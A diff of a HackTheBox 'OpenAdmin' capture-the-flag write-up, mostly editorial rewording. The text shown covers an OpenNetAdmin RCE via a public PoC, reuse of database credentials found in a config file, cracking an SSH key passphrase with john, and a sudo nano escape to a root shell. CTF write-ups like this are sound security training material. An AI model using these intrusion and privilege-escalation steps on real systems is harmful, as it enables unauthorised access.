@@ -41,13 +41,17 @@ Web service scan with [`whatweb`](whatweb-20240610.md):
 http://t [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Title[Apache2 Ubuntu Default Page: It works]
 ```
 
-Fuzzing for  uncovered `/music` and that led to `/ona`:
+Fuzzing for directories uncovers `/music`, and a link from there led to `/ona`:
 
 ![](_/htb-openadmin-20240701-1.png)
 
+This is [OpenNetAdmin](https://opennetadmin.com/), with plenty of attack surface:
+
+> OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. A full CLI interface is available as well to use for scripting and bulk work.
+
 ## RCE
 
-Here is how I achieved remote code execution on the target system.
+Here is how I achieved remote code execution (RCE) on the target system.
 
 The OpenNetAdmin service running on the target has an RCE vulnerability. I used [this PoC](https://github.com/amriunix/ona-rce):
 
@@ -67,9 +71,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## PE
 
-Here's how I was able to escalate privileges for full control of the system.
+Here's how I was able to accomplish privilege escalation (PE) for full control of the system.
 
-The file `local/config/database_settings.inc.php` has database credentials:
+In the server's web root, the file `local/config/database_settings.inc.php` contains database credentials:
 
 ```php
 <?php
@@ -93,7 +97,7 @@ $ona_contexts=array (
   ),
 ```
 
-I tried reusing that password for `root`, `joanna`, which didn't work, but it worked for user `jimmy`:
+I tried reusing that password for users `root` and `joanna`, neither of which worked, but it worked for user `jimmy`:
 
 ```console
 www-data@openadmin:/opt/ona/www$ su - jimmy
@@ -110,6 +114,7 @@ jimmy@openadmin:~$ find / -group internal 2>/dev/null
 /var/www/internal/main.php
 /var/www/internal/logout.php
 /var/www/internal/index.php
+
 jimmy@openadmin:~$ cat /var/www/internal/main.php
 <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
 # Open Admin Trusted
@@ -166,7 +171,7 @@ The credentials `jimmy:Revealed` give us the private key for `joanna`:
 
 ![](_/htb-openadmin-20240701-4.png)
 
-There's a passphrase for the private key, and the previous "ninja" password doesn't work. So, I use `john` to crack it:
+There's a passphrase for the private key, and the previously discovered "ninja" password didnt work. So, I used `john` to crack it, which only takes a few seconds:
 
 ```console
 $ ssh2john ./id_rsa  > john.id_rsa
@@ -184,7 +189,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-And that password grants access to the `joanna` account and user flag:
+That password grants access to the `joanna` account and user flag:
 
 ```console
 $ ssh -i id_rsa joanna@t
@@ -200,7 +205,7 @@ joanna@openadmin:~$ ls -l user.txt
 -r-------- 1 joanna joanna 33 Jul  1 17:53 user.txt
 ```
 
-To elevate privileges, there's a path via Sudo:
+Elevating privileges is possible via Sudo:
 
 ```console
 joanna@openadmin:~$ sudo -l
@@ -209,13 +214,17 @@ Matching Defaults entries for joanna on openadmin:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
 User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
+
 joanna@openadmin:~$ ls -l /opt/priv
 -rw-r--r-- 1 root root 0 Nov 22  2019 /opt/priv
+
 joanna@openadmin:~$ file /opt/priv
 /opt/priv: empty
+
 joanna@openadmin:~$ ls -ld /opt
 drwxr-xr-x 3 root root 4096 Jan  4  2020 /opt
+
 joanna@openadmin:~$ sudo /bin/nano /opt/priv
 ```
 
-From inside the `nano` editor, it's possible to execute a command via `^R^X` and `reset; sh 1>&0 2>&0`, which gives an interactive `root` shell.
+From inside the `nano` editor, it's possible to execute a shell command via `^R^X` and passing `reset; sh 1>&0 2>&0`, which provides an interactive `root` shell.
